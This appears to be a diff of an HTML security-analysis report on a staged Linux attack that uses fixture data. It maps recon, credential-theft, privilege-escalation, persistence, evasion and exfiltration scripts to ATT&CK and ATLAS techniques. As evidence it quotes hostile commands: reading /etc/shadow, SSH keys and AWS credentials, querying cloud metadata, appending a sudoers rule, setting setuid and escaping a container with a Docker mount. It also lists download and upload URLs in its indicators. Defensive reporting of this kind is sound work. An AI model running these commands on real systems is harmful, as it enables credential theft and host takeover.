@@ -35,7 +35,7 @@ th { text-align: left; font-size: 12px; text-transform: uppercase; letter-spacin
 td { vertical-align: top; padding: 5px 12px 5px 0; overflow-wrap: anywhere; }
 tr.entry td { border-top: 1px solid var(--line); }
 td.mark { white-space: nowrap; font-weight: 600; width: 1%; }
-td.cell { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; font-size: 13px; }
+td.cell { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; font-size: 13px; min-width: 11ch; }
 tr.detail td { padding-top: 0; }
 .under { margin: 0 0 6px; padding: 8px 10px; background: var(--panel); border-radius: 6px; }
 .under p { margin: 0 0 6px; }
@@ -70,9 +70,9 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 </header>
 <nav>
 <a href="#section-1">Summary</a>
-<a href="#section-2">Timeline</a>
-<a href="#section-3">Findings</a>
-<a href="#section-4">Notable files</a>
+<a href="#section-2">Tactics</a>
+<a href="#section-3">Timeline</a>
+<a href="#section-4">Findings</a>
 <a href="#section-5">Targeted</a>
 <a href="#section-6">Exposure</a>
 <a href="#section-7">Impact</a>
@@ -90,58 +90,116 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="cell">indicators</td><td class="cell">15</td><td class="cell">4 Domain, 1 Email, 7 IPv4, 3 URL</td></tr>
 <tr class="entry"><td class="cell">activities</td><td class="cell">26</td><td class="cell"></td></tr>
 <tr class="entry"><td class="cell">tactics</td><td class="cell">11</td><td class="cell"></td></tr>
-<tr class="entry"><td class="cell">targeted</td><td class="cell">6</td><td class="cell">Usernames 1, Hostnames 1, IP addresses 4</td></tr>
-<tr class="entry"><td class="cell">exposed</td><td class="cell">19</td><td class="cell">Passwords and secrets 3, Usernames 7, Email addresses 1, Devices 2, IP addresses 6</td></tr>
+<tr class="entry"><td class="cell">targeted</td><td class="cell">5</td><td class="cell">Hostnames 1, IP addresses 4</td></tr>
+<tr class="entry"><td class="cell">exposed</td><td class="cell">18</td><td class="cell">Passwords and secrets 3, Usernames 6, Email addresses 1, Devices 2, IP addresses 6</td></tr>
 </tbody>
 </table>
 </div>
 </section>
 <section id="section-2">
-<h2>Timeline</h2>
-<p class="note">from, until, files, tactics</p>
+<h2>Tactics</h2>
+<p class="note">tactic, identifiers, files</p>
 <div class="wrap">
 <table>
-<thead><tr><th>from</th><th>until</th><th>files</th><th>tactics</th></tr></thead>
+<thead><tr><th></th><th>tactic</th><th>identifiers</th><th>files</th></tr></thead>
 <tbody>
-<tr class="entry"><td class="cell">2026-10-22T09:00:00Z</td><td class="cell">2026-10-22T09:05:00Z</td><td class="cell">2</td><td class="cell">Discovery, CredentialAccess</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">activities</span><span class="value">SetuidFileSearch, CloudMetadataAccess, ServiceDiscovery, ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, ClusterSecretRead</span></div>
-<div class="pair"><span class="label">tools</span><span class="value">id, uname, cat, cut, systemctl, find, curl, grep, and 1 more</span></div>
-<div class="pair"><span class="label">files</span><span class="value">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh</span></div>
-</div></td></tr>
-<tr class="entry"><td class="cell">2026-10-22T09:10:00Z</td><td class="cell">-</td><td class="cell">1</td><td class="cell">Discovery, PrivilegeEscalation</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">activities</span><span class="value">SudoersModification, SetuidBit, ContainerEscape</span></div>
-<div class="pair"><span class="label">tools</span><span class="value">chmod, docker</span></div>
-<div class="pair"><span class="label">files</span><span class="value">20261022_091000_step03_privesc.sh</span></div>
-</div></td></tr>
-<tr class="entry"><td class="cell">2026-10-22T09:15:00Z</td><td class="cell">-</td><td class="cell">1</td><td class="cell">Execution, PrivilegeEscalation, Persistence</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">activities</span><span class="value">ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence</span></div>
-<div class="pair"><span class="label">tools</span><span class="value">crontab, cp, systemctl, useradd</span></div>
-<div class="pair"><span class="label">files</span><span class="value">20261022_091500_step04_persist.sh</span></div>
-</div></td></tr>
-<tr class="entry"><td class="cell">2026-10-22T09:20:00Z</td><td class="cell">-</td><td class="cell">1</td><td class="cell">Stealth, DefenseImpairment</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">activities</span><span class="value">LogDeletion, HistoryClearing, HistoryDisabling, SecurityToolDisabling, FirewallDisabling, Timestomp</span></div>
-<div class="pair"><span class="label">tools</span><span class="value">systemctl, iptables, rm, history, touch</span></div>
-<div class="pair"><span class="label">files</span><span class="value">20261022_092000_step05_evade.sh</span></div>
-</div></td></tr>
-<tr class="entry"><td class="cell">2026-10-22T09:25:00Z</td><td class="cell">2026-10-22T09:30:00Z</td><td class="cell">2</td><td class="cell">Discovery, LateralMovement, Execution, Collection, CommandAndControl, Exfiltration</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">activities</span><span class="value">FileUpload, ArchiveCreation, ShellDownloadAndExecute, ReverseShell</span></div>
-<div class="pair"><span class="label">tools</span><span class="value">tar, bash, curl, base64, sh, ssh, cat, find, and 6 more</span></div>
-<div class="pair"><span class="label">files</span><span class="value">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</span></div>
-</div></td></tr>
-<tr class="entry"><td class="cell">2026-10-22T09:35:00Z</td><td class="cell">-</td><td class="cell">1</td><td class="cell">Execution, Persistence, DefenseImpairment</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">activities</span><span class="value">ScheduledJobCreation, AccountCreation, SecurityToolDisabling, FirewallDisabling</span></div>
-<div class="pair"><span class="label">tools</span><span class="value">crontab, bash, useradd, systemctl, iptables</span></div>
-<div class="pair"><span class="label">files</span><span class="value">audit_20261022_093500.jsonl</span></div>
-</div></td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">CommandAndControl</td><td class="cell">TA0011, AML.TA0014</td><td class="cell">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">CredentialAccess</td><td class="cell">TA0006, AML.TA0013</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">DefenseImpairment</td><td class="cell">TA0112, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">Exfiltration</td><td class="cell">TA0010, AML.TA0010</td><td class="cell">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">LateralMovement</td><td class="cell">TA0008, AML.TA0015</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">Persistence</td><td class="cell">TA0003, AML.TA0006</td><td class="cell">20261022_091500_step04_persist.sh</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">PrivilegeEscalation</td><td class="cell">TA0004, AML.TA0012</td><td class="cell">20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Collection</td><td class="cell">TA0009, AML.TA0009</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Execution</td><td class="cell">TA0002, AML.TA0005</td><td class="cell">20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Stealth</td><td class="cell">TA0005, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
+<tr class="entry"><td class="mark low">[i]</td><td class="cell">Discovery</td><td class="cell">TA0007, AML.TA0008</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 1 more</td></tr>
 </tbody>
 </table>
 </div>
+</section>
+<section id="section-3">
+<h2>Timeline</h2>
+<p class="note">a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics, with the techniques its files show</p>
+<ol class="blocks">
+<li class="block"><span class="dot high"></span>
+<div class="head"><span class="mark high">[x]</span><span class="name">Discovery, CredentialAccess</span><span class="rest">2026-10-22T09:00:00Z to 2026-10-22T09:05:00Z</span></div>
+<div class="items">
+<span class="id">T1083</span><span class="value">File and Directory Discovery</span>
+<span class="id">T1552.005</span><span class="value">Unsecured Credentials: Cloud Instance Metadata API</span>
+<span class="id">T1007</span><span class="value">System Service Discovery</span>
+<span class="id">T1003.008</span><span class="value">OS Credential Dumping: /etc/passwd and /etc/shadow</span>
+<span class="id">T1552.004</span><span class="value">Unsecured Credentials: Private Keys</span>
+<span class="id">T1552.001</span><span class="value">Unsecured Credentials: Credentials In Files</span>
+<span class="id">T1552.003</span><span class="value">Unsecured Credentials: Shell History</span>
+<span class="id">T1552.007</span><span class="value">Unsecured Credentials: Container API</span>
+<span class="id">AML.T0055</span><span class="value">Unsecured Credentials</span>
+<span class="id">AML.T0090</span><span class="value">OS Credential Dumping</span>
+</div>
+</li>
+<li class="block"><span class="dot high"></span>
+<div class="head"><span class="mark high">[x]</span><span class="name">Discovery, PrivilegeEscalation</span><span class="rest">2026-10-22T09:10:00Z</span></div>
+<div class="items">
+<span class="id">T1548.003</span><span class="value">Abuse Elevation Control Mechanism: Sudo and Sudo Caching</span>
+<span class="id">T1548.001</span><span class="value">Abuse Elevation Control Mechanism: Setuid and Setgid</span>
+<span class="id">T1611</span><span class="value">Escape to Host</span>
+<span class="id">AML.T0105</span><span class="value">Escape to Host</span>
+</div>
+</li>
+<li class="block"><span class="dot high"></span>
+<div class="head"><span class="mark high">[x]</span><span class="name">Execution, PrivilegeEscalation, Persistence</span><span class="rest">2026-10-22T09:15:00Z</span></div>
+<div class="items">
+<span class="id">T1053.003</span><span class="value">Scheduled Task/Job: Cron</span>
+<span class="id">T1053.002</span><span class="value">Scheduled Task/Job: At</span>
+<span class="id">T1053.006</span><span class="value">Scheduled Task/Job: Systemd Timers</span>
+<span class="id">T1543.002</span><span class="value">Create or Modify System Process: Systemd Service</span>
+<span class="id">T1136.001</span><span class="value">Create Account: Local Account</span>
+<span class="id">T1098.004</span><span class="value">Account Manipulation: SSH Authorized Keys</span>
+<span class="id">T1546.004</span><span class="value">Event Triggered Execution: Unix Shell Configuration Modification</span>
+<span class="id">AML.T0125</span><span class="value">Create Account</span>
+<span class="id">AML.T0142</span><span class="value">Event Triggered Execution</span>
+</div>
+</li>
+<li class="block"><span class="dot high"></span>
+<div class="head"><span class="mark high">[x]</span><span class="name">Stealth, DefenseImpairment</span><span class="rest">2026-10-22T09:20:00Z</span></div>
+<div class="items">
+<span class="id">T1685.006</span><span class="value">Disable or Modify Tools: Clear Linux or Mac System Logs</span>
+<span class="id">T1070.003</span><span class="value">Indicator Removal: Clear Command History</span>
+<span class="id">T1690</span><span class="value">Prevent Command History Logging</span>
+<span class="id">T1685</span><span class="value">Disable or Modify Tools</span>
+<span class="id">T1685.004</span><span class="value">Disable or Modify Tools: Disable or Modify Linux Audit System Log</span>
+<span class="id">T1686</span><span class="value">Disable or Modify System Firewall</span>
+<span class="id">T1070.006</span><span class="value">Indicator Removal: Timestomp</span>
+<span class="id">AML.T0138</span><span class="value">Indicator Removal</span>
+</div>
+</li>
+<li class="block"><span class="dot high"></span>
+<div class="head"><span class="mark high">[x]</span><span class="name">Discovery, LateralMovement, Execution, Collection, CommandAndControl, Exfiltration</span><span class="rest">2026-10-22T09:25:00Z to 2026-10-22T09:30:00Z</span></div>
+<div class="items">
+<span class="id">T1048</span><span class="value">Exfiltration Over Alternative Protocol</span>
+<span class="id">T1560.001</span><span class="value">Archive Collected Data: Archive via Utility</span>
+<span class="id">T1059.004</span><span class="value">Command and Scripting Interpreter: Unix Shell</span>
+<span class="id">T1105</span><span class="value">Ingress Tool Transfer</span>
+<span class="id">T1095</span><span class="value">Non-Application Layer Protocol</span>
+<span class="id">AML.T0025</span><span class="value">Exfiltration via Cyber Means</span>
+<span class="id">AML.T0072</span><span class="value">Cyber Communication Channel</span>
+<span class="id">AML.T0050</span><span class="value">Command and Scripting Interpreter</span>
+</div>
+</li>
+<li class="block"><span class="dot high"></span>
+<div class="head"><span class="mark high">[x]</span><span class="name">Execution, Persistence, DefenseImpairment</span><span class="rest">2026-10-22T09:35:00Z</span></div>
+<div class="items">
+<span class="id">T1053.003</span><span class="value">Scheduled Task/Job: Cron</span>
+<span class="id">T1053.002</span><span class="value">Scheduled Task/Job: At</span>
+<span class="id">T1053.006</span><span class="value">Scheduled Task/Job: Systemd Timers</span>
+<span class="id">T1136.001</span><span class="value">Create Account: Local Account</span>
+<span class="id">T1685</span><span class="value">Disable or Modify Tools</span>
+<span class="id">T1685.004</span><span class="value">Disable or Modify Tools: Disable or Modify Linux Audit System Log</span>
+<span class="id">T1686</span><span class="value">Disable or Modify System Firewall</span>
+<span class="id">AML.T0125</span><span class="value">Create Account</span>
+</div>
+</li>
+</ol>
 <div class="wrap">
 <table>
 <tbody>
@@ -150,7 +208,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 </table>
 </div>
 </section>
-<section id="section-3">
+<section id="section-4">
 <h2>Findings</h2>
 <h3>activities</h3>
 <div class="wrap">
@@ -246,9 +304,10 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <div class="pair"><span class="label">what</span><span class="value">cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)</span></div>
 <div class="pair"><span class="label"></span><span class="value">systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">ArchiveCreation</td><td class="cell">1 line</td><td class="cell">Collection</td><td class="cell">T1560.001</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">ArchiveCreation</td><td class="cell">2 lines</td><td class="cell">Collection</td><td class="cell">T1560.001</td></tr>
 <tr class="detail"><td colspan="5"><div class="under">
 <div class="pair"><span class="label">what</span><span class="value">tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)</span></div>
+<div class="pair"><span class="label"></span><span class="value">find /srv -name &#39;*.bak&#39; -exec gzip {} \; (20261022_092500_step06_stage.sh:7)</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">HistoryClearing</td><td class="cell">1 line</td><td class="cell">Stealth</td><td class="cell">T1070.003, AML.T0138</td></tr>
 <tr class="detail"><td colspan="5"><div class="under">
@@ -269,109 +328,10 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 </tbody>
 </table>
 </div>
-<h3>indicators</h3>
-<div class="wrap">
-<table>
-<thead><tr><th></th><th>type</th><th>value</th><th>files</th></tr></thead>
-<tbody>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Domain</td><td class="cell">build01.corp.internal</td><td class="cell">hosts_20261022_090025.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Domain</td><td class="cell">corp.example</td><td class="cell">env_20261022_090540.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Domain</td><td class="cell">db01.corp.internal</td><td class="cell">env_20261022_090540.txt, hosts_20261022_090025.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Domain</td><td class="cell">files.example.net</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Email</td><td class="cell">alerts@corp.example</td><td class="cell">env_20261022_090540.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">10.20.30.5</td><td class="cell">hosts_20261022_090025.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">10.20.30.6</td><td class="cell">hosts_20261022_090025.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">127.0.0.1</td><td class="cell">hosts_20261022_090025.txt</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">169.254.169.254</td><td class="cell">20261022_090000_step01_recon.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">198.51.100.7</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">203.0.113.40</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">IPv4</td><td class="cell">203.0.113.41</td><td class="cell">20261022_093000_step07_channel.py</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">URL</td><td class="cell">http://169.254.169.254/latest/meta-data/</td><td class="cell">20261022_090000_step01_recon.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">URL</td><td class="cell">http://203.0.113.40/s.sh</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">URL</td><td class="cell">https://files.example.net/up</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-</tbody>
-</table>
-</div>
-<h3>tactics</h3>
-<div class="wrap">
-<table>
-<thead><tr><th></th><th>tactic</th><th>identifiers</th><th>files</th></tr></thead>
-<tbody>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">CommandAndControl</td><td class="cell">TA0011, AML.TA0014</td><td class="cell">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">CredentialAccess</td><td class="cell">TA0006, AML.TA0013</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">DefenseImpairment</td><td class="cell">TA0112, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Exfiltration</td><td class="cell">TA0010, AML.TA0010</td><td class="cell">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">LateralMovement</td><td class="cell">TA0008, AML.TA0015</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Persistence</td><td class="cell">TA0003, AML.TA0006</td><td class="cell">20261022_091500_step04_persist.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">PrivilegeEscalation</td><td class="cell">TA0004, AML.TA0012</td><td class="cell">20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh</td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Collection</td><td class="cell">TA0009, AML.TA0009</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Execution</td><td class="cell">TA0002, AML.TA0005</td><td class="cell">20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Stealth</td><td class="cell">TA0005, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
-<tr class="entry"><td class="mark low">[i]</td><td class="cell">Discovery</td><td class="cell">TA0007, AML.TA0008</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 1 more</td></tr>
-</tbody>
-</table>
-</div>
-</section>
-<section id="section-4">
-<h2>Notable files</h2>
-<p class="note">a finding of high severity</p>
-<div class="wrap">
-<table>
-<thead><tr><th></th><th>role</th><th>file</th></tr></thead>
-<tbody>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_090000_step01_recon.sh</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">CloudMetadataAccess</span></div>
-<div class="pair"><span class="label">linked</span><span class="value">passwd_20261022_090020.txt, hosts_20261022_090025.txt, suid_20261022_090030.txt and 1 more</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_090500_step02_creds.sh</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, ClusterSecretRead</span></div>
-<div class="pair"><span class="label">linked</span><span class="value">shadow_20261022_090530.txt, env_20261022_090540.txt</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_091000_step03_privesc.sh</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">SudoersModification, SetuidBit, ContainerEscape</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_091500_step04_persist.sh</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, useradd (Persistence)</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">LogDeletion, HistoryDisabling, SecurityToolDisabling, FirewallDisabling, iptables (DefenseImpairment)</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">FileUpload, ShellDownloadAndExecute, ssh (LateralMovement)</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">script</td><td class="cell">20261022_093000_step07_channel.py</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">ReverseShell, nc (Exfiltration)</span></div>
-</div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">output</td><td class="cell">audit_20261022_093500.jsonl</td></tr>
-<tr class="detail"><td colspan="3"><div class="under">
-<div class="pair"><span class="label">found</span><span class="value">ScheduledJobCreation, AccountCreation, SecurityToolDisabling, FirewallDisabling, useradd (Persistence), iptables (DefenseImpairment)</span></div>
-</div></td></tr>
-</tbody>
-</table>
-</div>
 </section>
 <section id="section-5">
 <h2>Targeted</h2>
 <p class="note">hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on</p>
-<h3>Usernames (1)</h3>
-<div class="wrap">
-<table>
-<thead><tr><th></th><th>value</th><th>origin</th><th>named in</th></tr></thead>
-<tbody>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">ops</td><td class="cell">prior</td><td class="cell">20261022_092500_step06_stage.sh:6</td></tr>
-<tr class="detail"><td colspan="4"><div class="under">
-<div class="pair"><span class="label">what</span><span class="value">ssh ops@198.51.100.7 &#39;cat /etc/hostname&#39; (20261022_092500_step06_stage.sh:6)</span></div>
-</div></td></tr>
-</tbody>
-</table>
-</div>
 <h3>Hostnames (1)</h3>
 <div class="wrap">
 <table>
@@ -642,30 +602,29 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 </section>
 <section id="section-6">
 <h2>Exposure</h2>
-<p class="note">collected: first seen in an output; used: first seen in a script</p>
+<p class="note">collected: first seen in an output; used: first seen in a script; a token or a value in base64 is written decoded, and the saved exposure file holds it as it stands</p>
 <h3>Passwords and secrets (3)</h3>
 <div class="wrap">
 <table>
-<thead><tr><th></th><th>value</th><th>what</th><th>seen</th><th>found in</th></tr></thead>
+<thead><tr><th></th><th>what</th><th>seen</th><th>value</th><th>found in</th></tr></thead>
 <tbody>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">$6$fixturesalt$fixturehashvalue0123456789abcdef</td><td class="cell">hash of deploy</td><td class="cell">collected</td><td class="cell">shadow_20261022_090530.txt:4</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Fixture-Pass-01</td><td class="cell">password of app_rw</td><td class="cell">collected</td><td class="cell">env_20261022_090540.txt:3</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">fixture-token-0123456789</td><td class="cell">token</td><td class="cell">collected</td><td class="cell">env_20261022_090540.txt:5</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">hash of deploy</td><td class="cell">collected</td><td class="cell">$6$fixturesalt$fixturehashvalue0123456789abcdef</td><td class="cell">shadow_20261022_090530.txt:4</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">password of app_rw</td><td class="cell">collected</td><td class="cell">Fixture-Pass-01</td><td class="cell">env_20261022_090540.txt:3</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">token</td><td class="cell">collected</td><td class="cell">fixture-token-0123456789</td><td class="cell">env_20261022_090540.txt:5</td></tr>
 </tbody>
 </table>
 </div>
-<h3>Usernames (7)</h3>
+<h3>Usernames (6)</h3>
 <div class="wrap">
 <table>
 <thead><tr><th></th><th>value</th><th>seen</th><th>found in</th></tr></thead>
 <tbody>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">alerts@corp.example</td><td class="cell">collected</td><td class="cell">env_20261022_090540.txt:4</td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">app_rw</td><td class="cell">collected</td><td class="cell">passwd_20261022_090020.txt:4, env_20261022_090540.txt:2</td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">daemon</td><td class="cell">collected</td><td class="cell">passwd_20261022_090020.txt:2</td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">deploy</td><td class="cell">collected</td><td class="cell">passwd_20261022_090020.txt:3</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">deploy</td><td class="cell">collected</td><td class="cell">passwd_20261022_090020.txt:3, shadow_20261022_090530.txt:4</td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">root</td><td class="cell">collected</td><td class="cell">passwd_20261022_090020.txt:1, audit_20261022_093500.jsonl:2</td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">svc</td><td class="cell">collected</td><td class="cell">audit_20261022_093500.jsonl:1</td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">ops</td><td class="cell">used</td><td class="cell">20261022_092500_step06_stage.sh:6</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">svc</td><td class="cell">used</td><td class="cell">20261022_091500_step04_persist.sh:7, audit_20261022_093500.jsonl:1, audit_20261022_093500.jsonl:2</td></tr>
 </tbody>
 </table>
 </div>
@@ -712,111 +671,71 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Privileged access obtained</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host</span></div>
-<div class="pair"><span class="label">what</span><span class="value">SudoersModification: echo &#34;$RULE&#34; &gt;&gt; /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SetuidBit: chmod u&#43;s &#34;$F&#34; (20261022_091000_step03_privesc.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">SudoersModification, SetuidBit, ContainerEscape</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Credentials exposed</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fixture-token-0123456789</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ShadowFileRead: sudo cat /etc/shadow &gt; shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">CloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ &gt; meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)</span></div>
